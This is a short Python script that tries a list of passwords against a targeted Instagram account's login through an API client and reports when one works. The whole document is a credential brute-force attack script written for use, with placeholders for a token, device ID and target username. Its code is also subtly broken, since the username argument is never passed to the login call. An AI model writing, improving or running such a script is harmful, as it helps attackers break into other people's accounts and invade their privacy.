def crack_password(api, username, passwords):
    for password in passwords:
        try:
            api.login(password=password)
            print(f"Password found: {password}")
            return
        except Exception as e:
            print(f"Failed with password: {password} - {e}")
# Initialize api here
api = Client(token="YOUR_TOKEN", device_id="YOUR_DEVICE_ID")

# Target Instagram username
username = "target_username"

# List of passwords to try
passwords = ["password1", "password2", "weakpassword"]

crack_password(api, username, passwords)